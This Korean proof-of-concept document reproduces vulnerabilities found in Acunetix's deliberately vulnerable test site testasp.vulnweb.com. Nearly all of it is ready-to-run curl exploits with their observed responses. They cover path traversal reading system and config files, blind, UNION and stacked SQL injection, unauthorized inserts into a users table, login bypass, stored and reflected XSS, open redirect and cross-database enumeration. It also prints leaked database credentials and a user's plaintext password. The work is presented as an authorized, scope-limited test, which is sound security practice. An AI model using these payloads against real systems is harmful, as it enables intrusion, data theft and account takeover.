# PoC 코드 — testphp-vulnweb-test (대상: testasp.vulnweb.com)

**성격**: 취약점 존재를 증명하는 **최소 재현 코드**. 각 항목은 "요청 → 관측값"만 담는다
(탐색 과정·자동화 코드는 `Exploit-코드.md`, 실행 순서 서술은 `PoC-시나리오.md`).
이 문서는 **project 누적 일지(phase 1 Round 1~6 + phase 2 Round 7~12) 전체에서 재생성**한 것이다.

**대상**: `http://testasp.vulnweb.com` — Acunetix 공개 테스트 사이트(classic ASP / IIS 8.5 /
MSSQL 2014 Express). 사이트 자체 경고문에 "deliberately vulnerable", **콘텐츠는 매일 초기화**.
원 타겟 `testphp.vulnweb.com`(44.228.249.3)은 2026-09-23 완전 다운(TCP 80/443 타임아웃, ICMP 100%
loss, 독립 vantage 3곳 실패) → 사용자 승인으로 scope 교체(project_id 는 유지).

**공통 준비**

```bash
BASE=http://testasp.vulnweb.com
# (선택) 하네스 mitmproxy 경유 — 캡처를 남기고 싶을 때만. 없어도 결과는 동일하다.
P="-x http://127.0.0.1:8080 --cacert /home/taeuk/.mitmproxy/mitmproxy-ca-cert.pem"

# 전체 재현 검증(쓰기 없음, 24체크): 결과 PASS=24 FAIL=0 확인
bash scripts/verify_chain.sh
```

⚠️ 사이트가 **매일 초기화**되므로 행 수·게시글 등 데이터 값은 시점에 따라 다르다(구조·취약점은
불변 — 초기화 전후로 소스 11개가 바이트 동일함을 확인했다).

---

## 1. Directory Traversal — 임의 파일 읽기 (인증 불요)

`Templatize.asp` 가 `FName = Server.MapPath(".") & "\" & Request.QueryString("item")` 로 경로를
조립한 뒤 `Scripting.FileSystemObject.OpenTextFile(FName, 1, False, 0)` 로 읽어 `Response.Write` 한다.

```bash
# (1-a) Windows 시스템 파일 — 평문 ../ 만 통한다
curl -s "$BASE/Templatize.asp?item=../../../../../../../../windows/win.ini"
#   → 200, '; for 16-bit app support' / [fonts] / [extensions] / [mci extensions] / [Mail] / MAPI=1
curl -s "$BASE/Templatize.asp?item=../../../../../../../../windows/system32/drivers/etc/hosts"
curl -s "$BASE/Templatize.asp?item=../../../../../../../../windows/system.ini"

# (1-b) 설정 파일 — 루트 기준 상대경로(부모가 아니라 루트에서 되돌아옴)
curl -s "$BASE/Templatize.asp?item=html/../web.config"
#   → 200, <configuration><system.web><authentication mode="Forms" /> … 전체

# (1-c) ASP 소스 평문 (실행되지 않고 include 되므로 소스가 나온다)
for f in db.asp logInput.asp Login.asp showforum.asp showthread.asp Search.asp \
         Templatize.asp Register.asp Logout.asp Default.asp web.config; do
  curl -s "$BASE/Templatize.asp?item=$f" -o "src_$f"
done
```

- 판정: 인코딩 변형(`..%2f`, `%2e%2e%2f`, `..%5c`, `..%252f`, `%00` 삽입)은 전부 500 → 평문 `../` 만 통함.
- 잔여 파일은 없음: `C:\scripts\logInput.txt`·`Default.asp.bak`·`web.config.bak`·`global.asa`·
  `boot.ini`·IIS `applicationHost.config`·`inetpub\wwwroot\web.config` → **전부 500**.
- 증거: `evidence/win_ini_proof.txt`, `evidence/webconfig_traversal_response.txt`,
  `evidence/hosts_file_traversal_response.txt`, `evidence/system_ini_traversal_response.txt`,
  `evidence/source_leak/*.txt`(11개 원문).

**(1-c) 의 결과 — DB 자격증명 노출 (db.asp:31)**

```vbscript
conn.Open "Provider=SQLNCLI11;Server=(local)\SQL;Database=acuforum;Uid=acunetix;Pwd=acunetixtrustno1;"
```

---

## 2. SQL Injection — boolean-blind (3개 벡터, 인증 불요)

오라클: **행이 반환되면 200, 0행 또는 SQL 오류면 IIS 기본 500**(에러 본문은 1208B 기본 페이지라
에러 기반 추출은 불가 → 블라인드로 진행).

```bash
# (2-a) showforum.asp?id=
curl -s -o /dev/null -w "%{http_code}\n" "$BASE/showforum.asp?id=1"                 # 200 (기준)
curl -s -o /dev/null -w "%{http_code}\n" "$BASE/showforum.asp?id=1%27"             # 500 (따옴표 → 구문 오류)
curl -s -o /dev/null -w "%{http_code}\n" "$BASE/showforum.asp?id=1%20AND%201=1"     # 200 (참)
curl -s -o /dev/null -w "%{http_code}\n" "$BASE/showforum.asp?id=1%20AND%201=2"     # 500 (거짓)
curl -s -o /dev/null -w "%{http_code}\n" "$BASE/showforum.asp?id=0%20OR%201=1"      # 200 (+883B, 전체 행)

# (2-b) showthread.asp?id= — 전 게시글 유출(당시 2,644,469 B / 'posted by' 1378건)
curl -s "$BASE/showthread.asp?id=0%20OR%201=1" -o dump.html && wc -c dump.html

# (2-c) Search.asp?tfSearch=
curl -s -o /dev/null -w "%{http_code}\n" "$BASE/Search.asp?tfSearch=a%27--"         # 500
curl -s -o /dev/null -w "%{http_code}\n" "$BASE/Search.asp?tfSearch=0%20OR%201=1"   # 200 (+790B)
```

**DBMS 판별 (MSSQL 확정 — 3신호)**

```bash
curl -s -o /dev/null -w "%{http_code}\n" "$BASE/showforum.asp?id=1%20AND%20LEN(%27a%27)=1"              # 200 → MSSQL
curl -s -o /dev/null -w "%{http_code}\n" "$BASE/showforum.asp?id=1%20AND%20LENGTH(%27a%27)=1"           # 500 → MySQL 아님
curl -s -o /dev/null -w "%{http_code}\n" "$BASE/showforum.asp?id=1%20AND%20ISNULL(NULL,%27x%27)=%27x%27" # 200 → MSSQL
```

**블라인드 추출 (이분탐색 오라클 — 추출기: `scripts/blind_extract.py`, 439요청)**

```bash
curl -s -o /dev/null -w "%{http_code}\n" "$BASE/showforum.asp?id=1%20AND%20LEN((DB_NAME()))=8"                    # 200 → 길이 8
curl -s -o /dev/null -w "%{http_code}\n" "$BASE/showforum.asp?id=1%20AND%20ASCII(SUBSTRING((DB_NAME()),1,1))%3E96" # 200 → 'a' 초과
# 결과: DB_NAME()='acuforum' / 테이블='forums,posts,threads,users' / SYSTEM_USER='acunetix' / COUNT(users)=1758(시점값)
```

**취약 라인(소스 유출본)**

```vbscript
' showforum.asp:9
rs.Open "SELECT name, descr FROM forums WHERE id=" & Request.QueryString("id"), conn
' showthread.asp:9
rs.Open "SELECT b.title, b.forumid, b.id as threadid, a.name FROM forums a, threads b WHERE a.id = b.forumid AND b.id=" & Request.QueryString("id"), conn
' Search.asp:78
sql = "... AND (CHARINDEX(a.title, '"&st&"')>0 OR CHARINDEX(a.message,'"&st&"')>0)"
```

---

## 3. SQL Injection — UNION 기반 **페이지 가시 추출** (Search.asp, 가장 강한 PoC)

phase 1 의 "UNION 불가"는 **오판이었다**(페이로드 형태 문제). 주입 지점이
`AND (CHARINDEX(a.title,'<st>')>0 OR CHARINDEX(a.message,'<st>')>0)` 처럼 **괄호 안 문자열 리터럴**
이라, 괄호·WHERE 를 정상 종료시키면 UNION 이 성립하고 결과가 페이지에 그대로 렌더된다(10컬럼).
`Search.asp` 는 파라미터가 **쿼리 1개에만** 쓰인다(showforum/showthread 는 컬럼 수가 다른 3~4개
쿼리에 같은 `id` 를 재사용하므로 컬럼 수를 맞출 수 없어 여전히 UNION 불가).

```bash
U="q')>0) UNION ALL SELECT 1,'ACU-MARKER','T','M',1,1,GETDATE(),'A','TT','FN'--"
curl -s "$BASE/Search.asp?tfSearch=$(python3 -c "import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1],safe=''))" "$U")" \
  | grep -o "posttitle'>[^<]*"
#   → posttitle'>ACU-MARKER   (요청 1개로 임의 데이터가 화면에 출력)
```

이 경로로 실제 유출(증거 `evidence/r7/r7_search_union_*.html`):

| 항목 | 값 |
|---|---|
| `@@version` | Microsoft SQL Server 2014 (SP3-GDR) (KB5029184) 12.0.6179.1 (X64) **Express Edition** on Windows NT 6.3 (Build 9600) |
| `DB_NAME()` / `SUSER_SNAME()` | `acuforum` / `acunetix` |
| 테이블 | `threads,users,forums,posts` |
| `users` 컬럼 | `uname,upass,email,realname,avatar` (**평문 비밀번호**) |
| `users` 1건(최소 추출) | `uname=netsparker(0x001DFE)`, `upass=Inv1@cti`, `email=invicti@example.com` |
| 행 수(당시) | users 453 / posts 21 / threads 8 / forums 3 |

---

## 4. SQL Injection — **stacked query (임의 T-SQL 문장 실행)** (인증 불요)

`;` 로 문장을 이어붙이면 서버가 배치로 실행한다. **차분 타이밍 오라클**로 확정:

```bash
# showthread.asp 는 같은 id 로 쿼리를 2회 실행 → 지연이 2배로 관측된다
curl -s -o /dev/null -w "%{time_total}\n" "$BASE/showthread.asp?id=0%3BIF%201%3D1%20WAITFOR%20DELAY%20%270%3A0%3A04%27--"   # 8.51s
curl -s -o /dev/null -w "%{time_total}\n" "$BASE/showthread.asp?id=0%3BIF%201%3D2%20WAITFOR%20DELAY%20%270%3A0%3A04%27--"   # 0.59s
# showforum.asp 는 3회 실행 → 지연값에 비례: 1s→3.37s / 3s→9.52s / 8s→24.35s / 5s→15.35s
# Login.asp 의 tfUName 에서도 성립(인증 전):  tfUName=x'; WAITFOR DELAY '0:0:04'--  → 200 응답 4.37s
```

---

## 5. SQLi → **임의 DML** (users 테이블 행 생성 — 사용자 승인 후 실증)

```bash
# (1) 멱등 가드가 있는 INSERT 를 stacked 로 실행
curl -s -o /dev/null -w "%{http_code}\n" "$BASE/showthread.asp?id=0%3BIF%20NOT%20EXISTS(SELECT%201%20FROM%20users%20WHERE%20uname%3D%27acu-r7%20proof%27)%20INSERT%20INTO%20users%20(uname,upass,email,realname,avatar)%20VALUES%20(%27acu-r7%20proof%27,%27P%40ss-r7%27,%27r7%40example.com%27,%27r7%27,%27%27)--"
#   → 200

# (2) 검증 A: UNION 추출로 행/값 확인 → COUNT=1, upass=P@ss-r7, realname=r7
# (3) 검증 B: **정상 로그인 폼**으로 그 계정 로그인
curl -s -c /tmp/j "$BASE/Login.asp" -o /dev/null
curl -s -b /tmp/j -c /tmp/j -X POST "$BASE/Login.asp" \
  --data "tfUName=acu-r7%20proof&tfUPass=P%40ss-r7" -D- -o /dev/null | grep -i location
#   → 302 Object moved / Location: Default.asp   (애플리케이션 인증이 실제로 통과)
curl -s -b /tmp/j "$BASE/Default.asp" | grep -o "logout acu-r7 proof"
```

**권한 오라클 (쓰기 없이 권한만 확인: 참이면 ≈8s, 거짓이면 ≈0.3s)**

```bash
curl -s -o /dev/null -w "%{time_total}\n" \
 "$BASE/showthread.asp?id=0%3BIF%20(SELECT%20HAS_PERMS_BY_NAME('posts','OBJECT','INSERT'))%3D1%20WAITFOR%20DELAY%20'0%3A0%3A04'--"
```

| 확인 | 결과 |
|---|---|
| `IS_MEMBER('db_datawriter')` / `db_datareader` | **true** / **true** |
| `IS_SRVROLEMEMBER('sysadmin')` / `securityadmin` / `IS_MEMBER('db_owner')` | false / false / false |
| `HAS_PERMS_BY_NAME('acuforum.dbo.users','OBJECT','INSERT')` | **true** |
| `acublog.dbo.users` UPDATE / `acublog.dbo.comments` INSERT | **true / true** |
| `acuservice.dbo.users` SELECT / UPDATE | **true / true** |
| `ALTER` / `CONTROL` / `bulkadmin` / `ADMINISTER BULK OPERATIONS` | false (스키마 변경·권한 상승·파일 접근 불가) |

---

## 6. SQLi 인증 우회 (Login.asp, 인증 불요)

```bash
JAR=/tmp/jar; rm -f $JAR
# 실패 기준선
curl -s -o /dev/null -w "%{http_code}\n" -X POST "$BASE/Login.asp" \
  --data "tfUName=__nosuchuser__&tfUPass=__wrongpw__"                    # 200 (실패 페이지)
# 우회
curl -s -D- -o /dev/null -c $JAR -X POST "$BASE/Login.asp" \
  --data "tfUName=admin'--&tfUPass=x"                                    # → 302 / Location: Default.asp
# 인증 상태 검증
curl -s -b $JAR "$BASE/Default.asp" | grep -o 'logout admin.--'          # 세션 메뉴에 입력값 그대로
curl -s -b $JAR "$BASE/showthread.asp?id=0" | grep -c frmPostMessage     # 1 → 답글 폼 개방
```

| payload | 결과 |
|---|---|
| `tfUName=admin'--` + 아무 비밀번호 | ✅ 302 |
| `tfUName=admin` + `tfUPass=' OR '1'='1` | ✅ 302 |
| `tfUName=' OR '1'='1'--` | ✅ 302 |
| `tfUName=x' OR 'x'='x` | ❌ 200 (실패 페이지) |
| `tfUName=' OR 1=1--` (따옴표 리터럴 없음) | ❌ 500 |

원인: `Login.asp:8` 직접 연결 + `Login.asp:37 Session.Contents("uname") = Request.Form("tfUName")`.

---

## 7. `/Register.asp` SQL Injection (INSERT 문자열 연결, 인증 불요)

정상 경로는 `avatar` 를 항상 `''` 로 하드코딩(`Register.asp:38`)하므로 **avatar 를 조작하면
주입이 증명**된다.

```bash
curl -s -D- -o /dev/null -X POST "$BASE/Register.asp" \
  --data-urlencode "tfUName=acu-r9-reg','RegR9!','r9@example.com','r9','INJECTED') ; IF 1=1 WAITFOR DELAY '0:0:04'--" \
  --data-urlencode "tfUPass=RegR9!" --data-urlencode "tfEmail=r9@example.com" --data-urlencode "tfRName=r9"
#   → 302 Location: Login.asp?RetURL=   이며 4.35초 (= 뒤 문장까지 실행 = stacked 성립)
# 검증: UNION 추출 SELECT avatar FROM users WHERE uname='acu-r9-reg'  → 'INJECTED'
#       정상 로그인 폼 acu-r9-reg / RegR9! → 302 Default.asp
```

원인: `Register.asp:33-39` — `INSERT INTO users (uname,upass,email,realname,avatar) VALUES
('" & Request.Form("tfUName") & "', … & "'')"`.

---

## 8. second-order SQLi — 세션 사용자명 → `posts.poster` (게시 필요)

`showthread.asp:60` / `showforum.asp:73` 은 **`poster` 만 이스케이프하지 않는다**
(`Replace(...,"'","''")` 는 `tfSubject`/`tfText` 에만 적용).

```bash
curl -s -c /tmp/j "$BASE/Login.asp" -o /dev/null
curl -s -b /tmp/j -c /tmp/j -X POST "$BASE/Login.asp" \
  --data-urlencode "tfUName=x' OR 1=1--" --data "tfUPass=x" -o /dev/null      # 302 + 세션 인증됨
curl -s -b /tmp/j -o /dev/null -w "%{http_code}\n" -X POST "$BASE/showthread.asp?id=0" \
  --data-urlencode "tfSubject=acuredteam-r10-2ndorder" --data-urlencode "tfText=second-order-test"
#   → 500   (정상 계정으로 같은 POST → 200 + 게시글 생성 = 대조군)
```

**임팩트 상한(과대주장 금지)**: 데이터 주입은 성립하지 않는다 — 로그인이 통과하는 문자열
(`WHERE uname='…'` 형태)은 게시 INSERT 의 `VALUES (…)` 목록에서 반드시 구문 오류가 되어 두
제약이 상호 배타적이다. 실제 임팩트는 **그 세션의 게시 기능 파괴(500)**.

---

## 9. Stored XSS (답글 1건 — 사용자 승인 후 실증)

게시글 필터는 `If InStr(1, Request.Form("tfText"), "<a href=") > 0 then Response.End` **하나뿐**이라
`<script>`·`<img onerror>`·`<svg onload>` 는 통과하고, 본문은 HTML 인코딩 없이 출력된다.

```bash
curl -s -b /tmp/j -X POST "$BASE/showthread.asp?id=0" \
  --data-urlencode "tfSubject=acuredteam-r8-xss-proof" \
  --data-urlencode "tfText=<img src=x onerror=alert(document.domain)>" -o /dev/null
curl -s "$BASE/showthread.asp?id=0" \
  | grep -o "<div class='posttext'><img src=x onerror=alert(document.domain)></div>"
```

재현 당시 응답 원문(증거 `evidence/r8/r8_thread_after_post.html`):

```html
<div class='posttitle'>acuredteam-r8-xss-proof - <요청 IP></div>
<div class='posttext'><img src=x onerror=alert(document.domain)></div>
```

- **쿠키 없는 비인증 요청에서도 동일 렌더** → 그 스레드를 여는 모든 방문자 브라우저에서 실행.
- 응답 헤더에 **CSP 없음**(`Cache-Control`, `Content-Type`, `Server`, `Set-Cookie`, `X-Powered-By` 만)
  → 인라인 이벤트 핸들러를 막는 요소가 없다.
- phase 1 에서는 쓰기 거부로 **미실증**이었고 phase 2 재승인 후 실증됐다.

---

## 10. Reflected XSS / 세션 사용자명 XSS (인증 불요)

```bash
# (a) 검색어 반사
curl -s "$BASE/Search.asp?tfSearch=%3Cscript%3Ealert(1)%3C/script%3E" | grep "searched for"
#   → <div class='path'>You searched for '<script>alert(1)</script>'</div>  (이스케이프 없음, " > 도 그대로)

# (b) 로그인 사용자명이 세션에 저장되고 모든 페이지 메뉴에 무인코딩 출력
curl -s -c /tmp/j -X POST "$BASE/Login.asp" \
  --data-urlencode "tfUName=<img src=x onerror=alert(document.domain)>' OR '1'='1'--" --data "tfUPass=x" -o /dev/null
curl -s -b /tmp/j "$BASE/Default.asp" | grep -o "logout <img[^<]*"
#   → logout <img src=x onerror=alert(document.domain)>' OR '1'='1'--
```

원인: `Login.asp:37` + `Default.asp:55`(등 모든 페이지) `Response.Write("… >logout " &
Session.Contents("uname") & "</a>")` — 쓰기 없이 성립하며 SQLi 우회와 같은 요청에서 실행된다.

---

## 11. Open Redirect (3개 경로, 인증 불요)

```bash
# (a) Login.asp — 로그인 성공 시에만 리다이렉트가 실행되므로 우회 로그인과 함께
curl -s -D- -o /dev/null -X POST "$BASE/Login.asp?RetURL=http%3A%2F%2Fexample.com%2F" \
  --data "tfUName=admin'--&tfUPass=x" | grep -i location          # → Location: http://example.com/
# (b) Logout.asp — 인증 불요
curl -s -D- -o /dev/null "$BASE/Logout.asp?RetURL=http%3A%2F%2Fexample.com%2F" | grep -i location
# (c) Register.asp — 소스상 동일 패턴(Response.Redirect(Request.QueryString("RetURL")))
# `//example.com/`(프로토콜 상대 URL)도 그대로 통과
```

---

## 12. 세션 쿠키 속성 결함 + HTTPS 부재 (설정)

```bash
curl -s -D- -o /dev/null "$BASE/Default.asp" | grep -i set-cookie
#   Set-Cookie: ASPSESSIONIDCCCTQDSA=<32hex>; path=/
#   → HttpOnly · Secure · SameSite 전부 없음, domain 미지정
# 로그인 POST 응답에는 Set-Cookie 가 없음 = 인증 시 세션 ID 미회전
curl -s -o /dev/null -w "%{http_code}\n" -m 40 https://testasp.vulnweb.com/Default.asp   # 000 (443 타임아웃)
# 보안 헤더: CSP / X-Frame-Options / X-Content-Type-Options / HSTS / Referrer-Policy / Permissions-Policy 전부 없음
```

세션 값이 곧 인증 상태(`Session.Contents("uname")`)이므로 확정된 XSS(9·10번)와 결합하면
`document.cookie` 로 세션 ID 탈취가 가능한 구성이다(각 요소 검증 완료 / 탈취 자체는 미실행 —
`Exploit-시나리오.md` ② 참고).

---

## 13. 교차 DB 접근 (인증 불요, SQLi 경유)

```bash
U="q')>0) UNION ALL SELECT 1,(SELECT STUFF((SELECT ','+name FROM sys.databases FOR XML PATH('')),1,1,'')),'T','M',1,1,GETDATE(),'A','TT','FN'--"
#   → master,tempdb,model,msdb,acublog,acuforum,acuservice
#   acublog: users(1행, uname/upass/alevel) · news(3) · comments(63)
#   acuservice: users(2행, id/username/password/name/joindate/ccnumber/ccverification/address)
```

값 추출은 범위 최소화 원칙에 따라 **하지 않았다**(테이블/컬럼/행 수만 확인). 쓰기 권한은
`HAS_PERMS_BY_NAME` 오라클로만 확인했다(실제 쓰기 없음).

---

## 14. 음성 결과 — 재현하면 안 되는 항목 (RCE/업로드 불가)

```bash
curl -s -o /dev/null -w "%{http_code}\n" -X PUT --data "x" "$BASE/r10probe.txt"  # 404 (검증 스크립트가 확인)
curl -s -o /dev/null -w "%{http_code}\n" -X TRACE "$BASE/Default.asp"            # 501
curl -s -o /dev/null -w "%{http_code}\n" "$BASE/Default~1.asp"                   # 404 (IIS 8.3 단축명)
```

- `OPTIONS` → `Allow: OPTIONS, TRACE, GET, HEAD, POST`(PUT/DELETE 없음) → **웹셸 업로드 경로 없음**.
- DB 권한: `sysadmin`/`securityadmin`/`db_owner` false + `xp_cmdshell`·Ole Automation `value_in_use=0`
  → **OS 명령 실행(RCE) 불가**(근거 5개: 위 + `bulkadmin`/BULK OPERATIONS 없음 + `ALTER`/`CONTROL` 없음).
- traversal 잔여 파일 없음 / 미발견 엔드포인트 열거 20여종 전부 404 / `RetURL` CRLF 헤더 인젝션 불가
  (ASP 가 `%0D%0A` 로 인코딩).
- `OBJECT_ID('xp_cmdshell')`·`xp_dirtree`·`xp_fileexist` 조회는 **판정 방법이 부적절**했다(확장
  프로시저는 `sys.objects` 에 그렇게 등록되지 않음) — 음성 근거로 쓰지 않고 "판정 불가"로 기록.
